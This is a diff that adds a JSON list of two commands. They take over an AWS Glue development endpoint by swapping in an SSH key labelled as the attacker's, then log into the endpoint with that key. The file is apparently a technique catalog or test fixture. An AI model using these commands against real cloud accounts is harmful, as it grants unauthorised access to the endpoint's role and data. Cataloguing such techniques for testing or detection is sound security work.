@@ -1,0 +1,4 @@
+[
+  "aws glue update-dev-endpoint --endpoint-name existing-endpoint --public-keys 'ssh-rsa AAAA...attacker-key'",
+  "ssh -i attacker-key glue@glue-endpoint-xxx.region.glue.amazonaws.com"
+]
